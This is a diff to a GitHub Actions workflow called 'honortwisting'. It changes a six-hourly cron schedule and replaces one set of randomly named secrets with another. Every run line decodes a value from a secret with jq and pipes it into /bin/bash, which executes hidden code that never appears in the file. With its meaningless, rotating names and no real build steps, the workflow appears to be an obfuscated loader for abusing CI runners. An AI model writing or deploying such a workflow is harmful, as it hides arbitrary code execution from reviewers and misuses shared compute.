@@ -3,29 +3,17 @@ name: honortwisting
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: honortwisting
         env:
-          lwd9832: ${{ secrets.lwd9832 }}
+          gwxnw417: ${{ secrets.gwxnw417 }}
         run: |
-          echo $lwd9832 | jq -r .gxwgk592 | /bin/bash
-          echo $dly9 | jq -r .p800 | /bin/bash
-          echo $pbg21444 | jq -r .cjs33 | /bin/bash
-          echo $onqx536 | jq -r .rvez29030 | /bin/bash
-          echo $eb783 | jq -r .p43692 | /bin/bash
-          echo $qjg48964 | jq -r .tstw1888 | /bin/bash
-          echo $ozkcb01 | jq -r .niyqh01 | /bin/bash
-          echo $l997 | jq -r .g4405 | /bin/bash
-          echo $nfry41843 | jq -r .kr0362 | /bin/bash
-          echo $z21146 | jq -r .d1 | /bin/bash
-          echo $cfryg3569 | jq -r .dqjxw73006 | /bin/bash
-          echo $vkpo8608 | jq -r .ve36 | /bin/bash
-          echo $k166 | jq -r .y96 | /bin/bash
-          echo $pglt9 | jq -r .a2 | /bin/bash
+          echo $gwxnw417 | jq -r .ea59 | /bin/bash
+          echo $iw62038 | jq -r .ujrc13480 | /bin/bash
+          echo $pa6 | jq -r .whte92492 | /bin/bash
 
